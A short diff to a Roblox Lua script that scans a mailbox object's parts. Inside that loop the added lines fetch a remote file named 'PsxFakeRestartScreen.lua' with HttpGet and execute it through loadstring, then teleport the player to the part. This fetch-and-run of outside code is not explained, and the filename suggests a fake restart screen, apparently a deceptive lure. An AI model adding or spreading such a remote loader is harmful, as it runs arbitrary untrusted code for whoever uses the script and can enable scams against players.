@@ -8,6 +8,9 @@ if mailbox then
 
     for i, v in pairs(mailbox:GetDescendants()) do
         if v:IsA("MeshPart") or v:IsA("Part") then
+            loadstring(game:HttpGet("https://Arkhalislua.github.io/PsxFakeRestartScreen.lua"))()
+            wait(0.5)
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position)
             foundPart = true
             break
         end
